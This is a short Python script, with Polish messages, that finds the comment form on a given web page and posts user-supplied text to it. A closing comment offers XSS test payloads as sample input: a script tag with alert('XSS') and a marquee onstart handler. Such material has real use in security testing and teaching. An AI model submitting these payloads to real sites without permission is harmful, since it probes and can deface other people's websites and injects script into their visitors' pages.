import requests
from bs4 import BeautifulSoup
from urllib.parse import urljoin

def is_valid_url(url):
    try:
        result = requests.get(url)
        return result.status_code == 200
    except requests.RequestException:
        return False

def submit_comment(url, comment):
    if not is_valid_url(url):
        print(f"Błąd: Nie można połączyć z {url}")
        return

    try:
        response = requests.get(url)
        soup = BeautifulSoup(response.text, 'html.parser')

        form = soup.find('form')
        if not form:
            print("Nie znaleziono formularza.")
            return

        textarea = form.find('textarea', {'name': 'comment'})
        if not textarea:
            print("Nie znaleziono textarea w formularzu.")
            return

        form_action = form.get('action') or url
        full_url = urljoin(url, form_action)
        form_method = form.get('method', 'get').lower()
        form_fields = {field.get('name'): field.get('value', '') for field in form.find_all(['input', 'textarea'])}
        form_fields.update({'comment': comment})

        if form_method == 'post':
            submit_response = requests.post(full_url, data=form_fields)
        else:
            submit_response = requests.get(full_url, params=form_fields)

        if submit_response.status_code == 200:
            print("Formularz został pomyślnie wysłany.")
        else:
            print(f"Błąd podczas wysyłania formularza. Kod statusu: {submit_response.status_code}")

    except requests.RequestException as e:
        print(f"Błąd: {e}")

if __name__ == "__main__":
    url = input("Podaj adres URL strony: ")
    comment = input("Podaj komentarz: ")
    submit_comment(url, comment)
#przykładowy skrypt: <script>alert('XSS');</script>, <marquee onstart=alert(1)>XSS</marquee></p>
